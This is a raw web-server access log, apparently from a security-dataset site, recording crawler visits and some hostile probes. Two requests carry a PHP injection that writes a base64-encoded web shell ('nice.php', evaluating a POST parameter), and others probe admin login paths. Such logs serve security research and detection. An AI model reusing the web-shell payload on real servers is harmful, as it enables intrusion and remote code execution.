218.69.187.229 - - [19/Mar/2022:19:33:45 -0700] "GET /favicon.ico HTTP/1.1" 200 391 "-" "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.66 Safari/537.36 SE 2.X MetaSr 1.0" 
17.121.112.18 - - [19/Mar/2022:19:34:43 -0700] "GET /self.logs/error.log.2020-08-19 HTTP/1.1" 200 307 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_5) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/13.1.1 Safari/605.1.15 (Applebot/0.1; +http://www.apple.com/go/applebot)" 
123.125.109.129 - - [19/Mar/2022:19:44:01 -0700] "GET / HTTP/1.1" 301 438 "-" "Sogou web spider/4.0(+http://www.sogou.com/docs/help/webmasters.htm#07)" 
17.121.113.24 - - [19/Mar/2022:19:49:29 -0700] "GET /self.logs/error.log.2020-12-02 HTTP/1.1" 200 307 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_5) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/13.1.1 Safari/605.1.15 (Applebot/0.1; +http://www.apple.com/go/applebot)" 
17.121.115.203 - - [19/Mar/2022:19:50:19 -0700] "GET /self.logs/error.log.2020-08-23 HTTP/1.1" 200 307 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_5) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/13.1.1 Safari/605.1.15 (Applebot/0.1; +http://www.apple.com/go/applebot)" 
17.121.113.50 - - [19/Mar/2022:19:50:55 -0700] "GET /self.logs/error.log.2020-02-17 HTTP/1.1" 200 307 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_5) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/13.1.1 Safari/605.1.15 (Applebot/0.1; +http://www.apple.com/go/applebot)" 
123.125.109.129 - - [19/Mar/2022:19:52:10 -0700] "GET / HTTP/1.1" 200 13147 "-" "Sogou web spider/4.0(+http://www.sogou.com/docs/help/webmasters.htm#07)" 
100.26.149.153 - - [19/Mar/2022:19:55:35 -0700] "GET / HTTP/1.1" 200 13140 "-" "Mozilla/5.0 (compatible; startmebot/1.0; +https://start.me/bot)" 
114.119.149.222 - - [19/Mar/2022:20:00:23 -0700] "GET /self.logs/error.log.2019-09-30.gz HTTP/1.1" 200 1624 "-" "Mozilla/5.0 (Linux; Android 7.0;) AppleWebKit/537.36 (KHTML, like Gecko) Mobile Safari/537.36 (compatible; PetalBot;+https://webmaster.petalsearch.com/site/petalbot)" 
51.222.253.6 - - [19/Mar/2022:20:13:48 -0700] "GET /Datasets%20Description/HTML_Bro_log_2/files.html HTTP/1.1" 200 1866 "-" "Mozilla/5.0 (compatible; AhrefsBot/7.0; +http://ahrefs.com/robot/)" 
148.66.18.130 - - [19/Mar/2022:20:14:20 -0700] "GET /index.php?m=--><?=file_put_contents(\"nice.php\",base64_decode(\"PD9waHAgY2xhc3MgeHsgcHVibGljIGZ1bmN0aW9uIGlwKCl7ICRjPSAiICRfUE9TVFtyaW5nb10iOyByZXR1cm4gJGM7IH0gfSAkYyA9IG5ldyB4KCk7ICRiID0gJGMgLT4gaXAoKTsgZXZhbCgkYik7IHByaW50KG1kNSgiUmluZ28iKSk7Pz4=\"));?> HTTP/1.1" 301 971 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.212 Safari/537.36" 
148.66.18.130 - - [19/Mar/2022:20:14:20 -0700] "GET /index.php?m=--><?=file_put_contents(\"nice.php\",base64_decode(\"PD9waHAgY2xhc3MgeHsgcHVibGljIGZ1bmN0aW9uIGlwKCl7ICRjPSAiICRfUE9TVFtyaW5nb10iOyByZXR1cm4gJGM7IH0gfSAkYyA9IG5ldyB4KCk7ICRiID0gJGMgLT4gaXAoKTsgZXZhbCgkYik7IHByaW50KG1kNSgiUmluZ28iKSk7Pz4=\"));?> HTTP/1.1" 418 710 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.212 Safari/537.36" 
49.7.20.137 - - [19/Mar/2022:20:15:53 -0700] "GET / HTTP/1.1" 200 13146 "-" "Sogou web spider/4.0(+http://www.sogou.com/docs/help/webmasters.htm#07)" 
17.121.113.222 - - [19/Mar/2022:20:16:17 -0700] "GET /self.logs/error.log.2020-08-09 HTTP/1.1" 200 307 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_5) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/13.1.1 Safari/605.1.15 (Applebot/0.1; +http://www.apple.com/go/applebot)" 
207.46.13.1 - - [19/Mar/2022:20:23:29 -0700] "GET /self.logs/2016/error.log.2016-05-10.gz HTTP/1.1" 200 898 "-" "Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)" 
17.121.112.191 - - [19/Mar/2022:20:30:12 -0700] "GET /self.logs/error.log.2020-11-03 HTTP/1.1" 200 307 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_5) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/13.1.1 Safari/605.1.15 (Applebot/0.1; +http://www.apple.com/go/applebot)" 
17.121.113.186 - - [19/Mar/2022:20:30:51 -0700] "GET /self.logs/error.log.2020-07-10 HTTP/1.1" 200 307 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_5) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/13.1.1 Safari/605.1.15 (Applebot/0.1; +http://www.apple.com/go/applebot)" 
114.119.149.228 - - [19/Mar/2022:20:33:47 -0700] "GET /self.logs/error.log.2020-02-01 HTTP/1.1" 200 351 "-" "Mozilla/5.0 (Linux; Android 7.0;) AppleWebKit/537.36 (KHTML, like Gecko) Mobile Safari/537.36 (compatible; PetalBot;+https://webmaster.petalsearch.com/site/petalbot)" 
114.119.140.174 - - [19/Mar/2022:20:44:59 -0700] "GET /self.logs/access.log.2018-06-02.gz HTTP/1.1" 200 13989 "-" "Mozilla/5.0 (Linux; Android 7.0;) AppleWebKit/537.36 (KHTML, like Gecko) Mobile Safari/537.36 (compatible; PetalBot;+https://webmaster.petalsearch.com/site/petalbot)" 
17.121.114.195 - - [19/Mar/2022:20:45:30 -0700] "GET /self.logs/error.log.2020-11-25 HTTP/1.1" 200 307 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_5) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/13.1.1 Safari/605.1.15 (Applebot/0.1; +http://www.apple.com/go/applebot)" 
123.57.205.17 - - [19/Mar/2022:20:45:52 -0700] "GET / HTTP/1.1" 301 438 "-" "python-requests/2.25.1" 
123.57.205.17 - - [19/Mar/2022:20:45:53 -0700] "GET / HTTP/1.1" 200 13146 "-" "python-requests/2.25.1" 
185.191.171.25 - - [19/Mar/2022:20:46:35 -0700] "GET /self.logs/access.log.2019-07-15 HTTP/1.1" 200 201480 "-" "Mozilla/5.0 (compatible; SemrushBot/7~bl; +http://www.semrush.com/bot.html)" 
17.121.115.190 - - [19/Mar/2022:20:49:09 -0700] "GET /self.logs/error.log.2020-09-04 HTTP/1.1" 200 307 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_5) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/13.1.1 Safari/605.1.15 (Applebot/0.1; +http://www.apple.com/go/applebot)" 
17.121.112.150 - - [19/Mar/2022:20:53:58 -0700] "GET /self.logs/error.log.2020-06-06 HTTP/1.1" 200 307 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_5) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/13.1.1 Safari/605.1.15 (Applebot/0.1; +http://www.apple.com/go/applebot)" 
17.121.113.165 - - [19/Mar/2022:20:56:19 -0700] "GET /self.logs/error.log.2020-07-29 HTTP/1.1" 200 307 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_5) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/13.1.1 Safari/605.1.15 (Applebot/0.1; +http://www.apple.com/go/applebot)" 
114.119.145.137 - - [19/Mar/2022:20:56:42 -0700] "GET /self.logs/access.log.2020-07-12.gz HTTP/1.1" 200 12366 "-" "Mozilla/5.0 (Linux; Android 7.0;) AppleWebKit/537.36 (KHTML, like Gecko) Mobile Safari/537.36 (compatible; PetalBot;+https://webmaster.petalsearch.com/site/petalbot)" 
17.121.114.48 - - [19/Mar/2022:20:58:39 -0700] "GET /self.logs/error.log.2020-02-14 HTTP/1.1" 200 307 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_5) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/13.1.1 Safari/605.1.15 (Applebot/0.1; +http://www.apple.com/go/applebot)" 
17.121.113.109 - - [19/Mar/2022:21:01:11 -0700] "GET /self.logs/error.log.2020-11-29 HTTP/1.1" 200 307 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_5) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/13.1.1 Safari/605.1.15 (Applebot/0.1; +http://www.apple.com/go/applebot)" 
49.7.20.137 - - [19/Mar/2022:21:02:19 -0700] "GET / HTTP/1.1" 200 13148 "-" "Sogou web spider/4.0(+http://www.sogou.com/docs/help/webmasters.htm#07)" 
17.121.112.116 - - [19/Mar/2022:21:06:07 -0700] "GET /self.logs/error.log.2020-06-20 HTTP/1.1" 200 307 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_5) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/13.1.1 Safari/605.1.15 (Applebot/0.1; +http://www.apple.com/go/applebot)" 
112.47.58.182 - - [19/Mar/2022:21:13:29 -0700] "GET /e/data/js/ajax.js HTTP/1.1" 404 328 "-" "Mozilla/5.0 (Windows NT 10.0; WOW64; rv:48.0) Gecko/20100101 Firefox/48.0" 
157.55.39.31 - - [19/Mar/2022:21:18:02 -0700] "GET /self.logs/error.log.2020-08-20 HTTP/1.1" 200 351 "-" "Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)" 
17.121.112.239 - - [19/Mar/2022:21:19:30 -0700] "GET /self.logs/error.log.2020-03-04 HTTP/1.1" 200 307 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_5) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/13.1.1 Safari/605.1.15 (Applebot/0.1; +http://www.apple.com/go/applebot)" 
114.119.145.137 - - [19/Mar/2022:21:19:31 -0700] "GET /self.logs/access.log.2018-10-08.gz HTTP/1.1" 200 21675 "-" "Mozilla/5.0 (Linux; Android 7.0;) AppleWebKit/537.36 (KHTML, like Gecko) Mobile Safari/537.36 (compatible; PetalBot;+https://webmaster.petalsearch.com/site/petalbot)" 
162.241.148.253 - - [19/Mar/2022:21:20:57 -0700] "HEAD / HTTP/1.1" 200 359 "https://www.ilovephd.com" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/70.0.3538.102 Safari/537.36" 
17.121.113.20 - - [19/Mar/2022:21:23:22 -0700] "GET /self.logs/ HTTP/1.1" 200 35026 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_5) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/13.1.1 Safari/605.1.15 (Applebot/0.1; +http://www.apple.com/go/applebot)" 
17.121.112.139 - - [19/Mar/2022:21:27:08 -0700] "GET /self.logs/error.log.2020-03-15 HTTP/1.1" 200 1305 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_5) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/13.1.1 Safari/605.1.15 (Applebot/0.1; +http://www.apple.com/go/applebot)" 
207.46.13.1 - - [19/Mar/2022:21:27:33 -0700] "GET /self.logs/error.log.2018-01-31.gz HTTP/1.1" 200 2143 "-" "Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)" 
157.55.39.31 - - [19/Mar/2022:21:30:47 -0700] "GET /self.logs/error.log.2019-04-15.gz HTTP/1.1" 200 4093 "-" "Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)" 
40.77.167.0 - - [19/Mar/2022:21:32:56 -0700] "GET /self.logs/access.log.2017-11-23.gz HTTP/1.1" 200 22457 "-" "Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)" 
17.121.114.110 - - [19/Mar/2022:21:35:23 -0700] "GET /self.logs/error.log.2020-10-27 HTTP/1.1" 200 307 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_5) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/13.1.1 Safari/605.1.15 (Applebot/0.1; +http://www.apple.com/go/applebot)" 
92.119.17.223 - - [19/Mar/2022:21:38:49 -0700] "GET /Datasets%20Description/PE_malware/VirusShare.html HTTP/1.1" 200 1651 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/99.0.4844.74 Safari/537.36" 
92.119.17.223 - - [19/Mar/2022:21:38:49 -0700] "GET /favicon.ico HTTP/1.1" 200 368 "http://www.secrepo.com/Datasets%20Description/PE_malware/VirusShare.html" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/99.0.4844.74 Safari/537.36" 
116.62.121.143 - - [19/Mar/2022:21:39:38 -0700] "GET / HTTP/1.1" 200 13185 "-" "Mozilla/5.0 (Linux; Android 6.0; Nexus 5 Build/MRA58N) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4239.0 Mobile Safari/537.36" 
116.62.121.143 - - [19/Mar/2022:21:39:38 -0700] "GET /css/style.css HTTP/1.1" 404 305 "http://www.secrepo.com/" "Mozilla/5.0 (Linux; Android 6.0; Nexus 5 Build/MRA58N) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4239.0 Mobile Safari/537.36" 
116.62.121.143 - - [19/Mar/2022:21:39:38 -0700] "GET /twitter-icon.png HTTP/1.1" 200 27916 "http://www.secrepo.com/" "Mozilla/5.0 (Linux; Android 6.0; Nexus 5 Build/MRA58N) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4239.0 Mobile Safari/537.36" 
116.62.121.143 - - [19/Mar/2022:21:39:38 -0700] "GET /GitHub-Mark.png HTTP/1.1" 200 7556 "http://www.secrepo.com/" "Mozilla/5.0 (Linux; Android 6.0; Nexus 5 Build/MRA58N) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4239.0 Mobile Safari/537.36" 
116.62.121.143 - - [19/Mar/2022:21:40:14 -0700] "GET /bootstrap/img/favicon.ico HTTP/1.1" 200 713 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.45 Safari/537.36" 
116.62.121.143 - - [19/Mar/2022:21:40:15 -0700] "GET /twitter-icon.png HTTP/1.1" 200 27916 "http://www.google.com" "Mozilla/5.0 (Windows; U; WindowsNT 5.1; en-US; rv1.8.1.6) Gecko/20070725 Firefox/2.0.0.6" 
116.62.121.143 - - [19/Mar/2022:21:40:16 -0700] "GET /GitHub-Mark.png HTTP/1.1" 200 7556 "http://www.google.com" "Mozilla/5.0 (Windows; U; WindowsNT 5.1; en-US; rv1.8.1.6) Gecko/20070725 Firefox/2.0.0.6" 
49.7.20.137 - - [19/Mar/2022:21:45:29 -0700] "GET / HTTP/1.1" 200 13148 "-" "Sogou web spider/4.0(+http://www.sogou.com/docs/help/webmasters.htm#07)" 
185.191.171.21 - - [19/Mar/2022:21:48:17 -0700] "GET /robots.txt HTTP/1.1" 200 340 "-" "Mozilla/5.0 (compatible; SemrushBot/7~bl; +http://www.semrush.com/bot.html)" 
185.191.171.3 - - [19/Mar/2022:21:48:17 -0700] "GET /self.logs/error.log.2020-01-29 HTTP/1.1" 200 1319 "-" "Mozilla/5.0 (compatible; SemrushBot/7~bl; +http://www.semrush.com/bot.html)" 
106.125.104.80 - - [19/Mar/2022:21:48:18 -0700] "GET /favicon.ico HTTP/1.1" 200 391 "-" "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.198 Safari/537.36" 
103.131.71.82 - - [19/Mar/2022:21:51:50 -0700] "GET /robots.txt HTTP/1.1" 301 458 "-" "Mozilla/5.0 (compatible; coccocbot-web/1.0; +http://help.coccoc.com/searchengine)" 
103.131.71.82 - - [19/Mar/2022:21:51:52 -0700] "GET /robots.txt HTTP/1.1" 200 340 "-" "Mozilla/5.0 (compatible; coccocbot-web/1.0; +http://help.coccoc.com/searchengine)" 
103.131.71.191 - - [19/Mar/2022:21:51:54 -0700] "GET / HTTP/1.1" 301 438 "-" "Mozilla/5.0 (compatible; coccocbot-web/1.0; +http://help.coccoc.com/searchengine)" 
103.131.71.166 - - [19/Mar/2022:21:51:56 -0700] "GET /robots.txt HTTP/1.1" 200 340 "-" "Mozilla/5.0 (compatible; coccocbot-web/1.0; +http://help.coccoc.com/searchengine)" 
103.131.71.233 - - [19/Mar/2022:21:51:58 -0700] "GET / HTTP/1.1" 200 13148 "-" "Mozilla/5.0 (compatible; coccocbot-web/1.0; +http://help.coccoc.com/searchengine)" 
103.131.71.155 - - [19/Mar/2022:21:52:00 -0700] "GET / HTTP/1.1" 200 13148 "-" "Mozilla/5.0 (compatible; coccocbot-web/1.0; +http://help.coccoc.com/searchengine)" 
222.186.190.209 - - [19/Mar/2022:21:53:14 -0700] "POST /index.php?s=/admin/index/dologin HTTP/1.1" 404 328 "-" "python-requests/2.27.1" 
185.191.171.37 - - [19/Mar/2022:22:00:55 -0700] "GET /self.logs/error.log.2020-01-20 HTTP/1.1" 200 314 "-" "Mozilla/5.0 (compatible; SemrushBot/7~bl; +http://www.semrush.com/bot.html)" 
40.77.167.45 - - [19/Mar/2022:22:01:51 -0700] "GET /self.logs/error.log.2017-05-28.gz HTTP/1.1" 200 947 "-" "Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)" 
17.121.113.150 - - [19/Mar/2022:22:04:31 -0700] "GET /self.logs/error.log.2020-09-23 HTTP/1.1" 200 307 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_5) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/13.1.1 Safari/605.1.15 (Applebot/0.1; +http://www.apple.com/go/applebot)" 
114.119.149.228 - - [19/Mar/2022:22:10:40 -0700] "GET /self.logs/error.log.2020-08-04 HTTP/1.1" 200 351 "-" "Mozilla/5.0 (Linux; Android 7.0;) AppleWebKit/537.36 (KHTML, like Gecko) Mobile Safari/537.36 (compatible; PetalBot;+https://webmaster.petalsearch.com/site/petalbot)" 
66.249.64.149 - - [19/Mar/2022:22:15:23 -0700] "GET /ads.txt HTTP/1.1" 404 328 "-" "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)" 
222.186.190.248 - - [19/Mar/2022:22:21:43 -0700] "GET /data/admin/allowurl.txt HTTP/1.1" 404 328 "-" "Mozilla/5.0 (Windows NT 10.0; WOW64; rv:48.0) Gecko/20100101 Firefox/48.0" 
114.119.149.228 - - [19/Mar/2022:22:22:06 -0700] "GET /self.logs/access.log.2019-04-05.gz HTTP/1.1" 200 42891 "-" "Mozilla/5.0 (Linux; Android 7.0;) AppleWebKit/537.36 (KHTML, like Gecko) Mobile Safari/537.36 (compatible; PetalBot;+https://webmaster.petalsearch.com/site/petalbot)" 
49.7.20.137 - - [19/Mar/2022:22:24:52 -0700] "GET / HTTP/1.1" 200 13148 "-" "Sogou web spider/4.0(+http://www.sogou.com/docs/help/webmasters.htm#07)" 
193.30.121.226 - - [19/Mar/2022:22:30:49 -0700] "GET / HTTP/1.1" 301 475 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.36" 
193.30.121.226 - - [19/Mar/2022:22:30:50 -0700] "GET / HTTP/1.1" 200 49133 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.36" 
114.119.149.218 - - [19/Mar/2022:22:39:03 -0700] "GET /self.logs/error.log.2018-05-31.gz HTTP/1.1" 200 6848 "-" "Mozilla/5.0 (Linux; Android 7.0;) AppleWebKit/537.36 (KHTML, like Gecko) Mobile Safari/537.36 (compatible; PetalBot;+https://webmaster.petalsearch.com/site/petalbot)" 
114.119.149.222 - - [19/Mar/2022:22:50:16 -0700] "GET /self.logs/access.log.2020-05-10.gz HTTP/1.1" 200 13163 "-" "Mozilla/5.0 (Linux; Android 7.0;) AppleWebKit/537.36 (KHTML, like Gecko) Mobile Safari/537.36 (compatible; PetalBot;+https://webmaster.petalsearch.com/site/petalbot)" 
180.76.113.252 - - [19/Mar/2022:22:53:06 -0700] "HEAD / HTTP/1.1" 200 425 "-" "python-requests/2.27.1" 
114.119.145.137 - - [19/Mar/2022:22:55:55 -0700] "GET /self.logs/error.log.2020-01-02.gz HTTP/1.1" 200 867 "-" "Mozilla/5.0 (Linux; Android 7.0;) AppleWebKit/537.36 (KHTML, like Gecko) Mobile Safari/537.36 (compatible; PetalBot;+https://webmaster.petalsearch.com/site/petalbot)" 
51.222.253.15 - - [19/Mar/2022:22:57:17 -0700] "GET / HTTP/1.1" 200 13141 "-" "Mozilla/5.0 (compatible; AhrefsBot/7.0; +http://ahrefs.com/robot/)" 
49.7.20.137 - - [19/Mar/2022:23:01:58 -0700] "GET / HTTP/1.1" 200 13148 "-" "Sogou web spider/4.0(+http://www.sogou.com/docs/help/webmasters.htm#07)" 
114.119.149.228 - - [19/Mar/2022:23:12:46 -0700] "GET /self.logs/error.log.2020-01-05.gz HTTP/1.1" 200 970 "-" "Mozilla/5.0 (Linux; Android 7.0;) AppleWebKit/537.36 (KHTML, like Gecko) Mobile Safari/537.36 (compatible; PetalBot;+https://webmaster.petalsearch.com/site/petalbot)" 
188.71.242.115 - - [19/Mar/2022:23:13:11 -0700] "GET / HTTP/1.1" 200 13141 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/99.0.4844.74 Safari/537.36" 
188.71.242.115 - - [19/Mar/2022:23:13:12 -0700] "GET /css/style.css HTTP/1.1" 404 250 "http://www.secrepo.com/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/99.0.4844.74 Safari/537.36" 
188.71.242.115 - - [19/Mar/2022:23:13:12 -0700] "GET /twitter-icon.png HTTP/1.1" 200 27838 "http://www.secrepo.com/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/99.0.4844.74 Safari/537.36" 
188.71.242.115 - - [19/Mar/2022:23:13:12 -0700] "GET /GitHub-Mark.png HTTP/1.1" 200 7512 "http://www.secrepo.com/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/99.0.4844.74 Safari/537.36" 
188.71.242.115 - - [19/Mar/2022:23:13:14 -0700] "GET /bootstrap/img/favicon.ico HTTP/1.1" 200 635 "http://www.secrepo.com/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/99.0.4844.74 Safari/537.36" 
118.184.177.110 - - [19/Mar/2022:23:20:09 -0700] "GET / HTTP/1.1" 200 13148 "-" "Sogou web spider/4.0(+http://www.sogou.com/docs/help/webmasters.htm#07)" 
17.121.113.143 - - [19/Mar/2022:23:21:27 -0700] "GET /self.logs/error.log.2020-11-04 HTTP/1.1" 200 307 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_5) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/13.1.1 Safari/605.1.15 (Applebot/0.1; +http://www.apple.com/go/applebot)" 
40.77.167.0 - - [19/Mar/2022:23:21:34 -0700] "GET /self.logs/error.log.2020-11-07 HTTP/1.1" 200 351 "-" "Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)" 
49.7.20.137 - - [19/Mar/2022:23:33:52 -0700] "GET / HTTP/1.1" 200 13148 "-" "Sogou web spider/4.0(+http://www.sogou.com/docs/help/webmasters.htm#07)" 
114.119.145.137 - - [19/Mar/2022:23:40:59 -0700] "GET /self.logs/access.log.2020-08-09.gz HTTP/1.1" 200 9673 "-" "Mozilla/5.0 (Linux; Android 7.0;) AppleWebKit/537.36 (KHTML, like Gecko) Mobile Safari/537.36 (compatible; PetalBot;+https://webmaster.petalsearch.com/site/petalbot)" 
95.152.40.229 - - [19/Mar/2022:23:47:54 -0700] "GET / HTTP/1.1" 200 13186 "http://www.secrepo.com/" "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)" 
103.131.71.209 - - [19/Mar/2022:23:53:46 -0700] "GET /robots.txt HTTP/1.1" 200 340 "-" "Mozilla/5.0 (compatible; coccocbot-image/1.0; +http://help.coccoc.com/searchengine)" 
103.131.71.208 - - [19/Mar/2022:23:53:48 -0700] "GET /favicon.ico HTTP/1.1" 200 354 "-" "Mozilla/5.0 (compatible; coccocbot-image/1.0; +http://help.coccoc.com/searchengine)" 
49.7.20.137 - - [20/Mar/2022:00:03:00 -0700] "GET / HTTP/1.1" 200 13144 "-" "Sogou web spider/4.0(+http://www.sogou.com/docs/help/webmasters.htm#07)" 
114.119.149.228 - - [20/Mar/2022:00:03:25 -0700] "GET /self.logs/access.log.2020-03-27.gz HTTP/1.1" 200 16224 "-" "Mozilla/5.0 (Linux; Android 7.0;) AppleWebKit/537.36 (KHTML, like Gecko) Mobile Safari/537.36 (compatible; PetalBot;+https://webmaster.petalsearch.com/site/petalbot)" 
51.222.253.20 - - [20/Mar/2022:00:04:08 -0700] "GET /Datasets%20Description/HTML_Bro_log_2/loaded_scripts.html HTTP/1.1" 200 1499 "-" "Mozilla/5.0 (compatible; AhrefsBot/7.0; +http://ahrefs.com/robot/)" 
114.119.145.137 - - [20/Mar/2022:00:14:36 -0700] "GET /self.logs/error.log.2020-12-06 HTTP/1.1" 200 351 "-" "Mozilla/5.0 (Linux; Android 7.0;) AppleWebKit/537.36 (KHTML, like Gecko) Mobile Safari/537.36 (compatible; PetalBot;+https://webmaster.petalsearch.com/site/petalbot)" 
206.47.249.246 - - [20/Mar/2022:00:15:18 -0700] "GET /self.logs/error.log.2019-04-23.gz HTTP/1.1" 304 280 "-" "Mozilla/4.0 (compatible;)" 
114.119.149.222 - - [20/Mar/2022:00:20:15 -0700] "GET /self.logs/error.log.2017-08-15.gz HTTP/1.1" 200 1049 "-" "Mozilla/5.0 (Linux; Android 7.0;) AppleWebKit/537.36 (KHTML, like Gecko) Mobile Safari/537.36 (compatible; PetalBot;+https://webmaster.petalsearch.com/site/petalbot)" 
54.166.132.109 - - [20/Mar/2022:00:25:20 -0700] "GET /bootstrap/img/favicon.ico HTTP/1.1" 304 263 "-" "Mozilla/5.0 (X11; U; Linux x86_64; en-US) AppleWebKit/532.9 (KHTML, like Gecko) Chrome/5.0.307.7 Safari/532.9" 
114.119.140.174 - - [20/Mar/2022:00:25:57 -0700] "GET /self.logs/2015/error.log.2015-08-09.gz HTTP/1.1" 200 901 "-" "Mozilla/5.0 (Linux; Android 7.0;) AppleWebKit/537.36 (KHTML, like Gecko) Mobile Safari/537.36 (compatible; PetalBot;+https://webmaster.petalsearch.com/site/petalbot)" 
